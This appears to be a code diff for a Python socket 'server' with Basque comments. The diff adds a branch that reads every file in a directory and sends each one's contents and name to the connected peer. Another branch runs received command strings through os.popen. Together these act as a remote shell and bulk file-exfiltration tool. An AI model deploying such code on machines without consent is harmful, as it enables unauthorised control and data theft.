@@ -80,21 +80,29 @@ class server(object):
                       except IOError as e: 
                          erantzuna = "comandoa gaizki dago"
           #datuak bidali eta hartu 
-          if comand[0].lower() == "local":
+          if comand[0].lower() == "local" and len(comand) > 1:
               if comand[1].lower() == "all":
                   print("all")
-                  dire = os.path.isdir(url)
                   di = os.listdir(url)
                   for x in di:
-                      if os.path.isdir(url + "\\" + x) == True:
+                      if os.path.isdir(url + "\\" + x) != True:
                           try:
-                           fichategia = open("server.py",'rb')
-                           print(fichategia.read())
+                           print("\n","*","\n")  
+                           print(x)
+                           fichategia = open(x,'rb').read()
+                           luz = str(sys.getsizeof(fichategia))
+                           print(luz)
+                           luz_send = self.soc.send(bytes(luz,encoding = 'utf-8')) 
+                           self.soc.recv(1024)
+                           fich_send = self.soc.sendall(fichategia)
+                           self.soc.recv(1024)
+                           izena_send = self.soc.send(bytes(x,encoding = 'utf-8'))
+                           print("\n","*","\n")
                           except IOError as e:
                            print("bai")
-                  print(di)
+                  self.soc.send(bytes("0",encoding = 'utf-8'))
               else:
-                  print(comand[0].lower())
+                erantzuna = "comandoa gaizki dago"
           #cmd ejekutagarria
           else:
             balioa = os.popen(stri,'r',1).close()
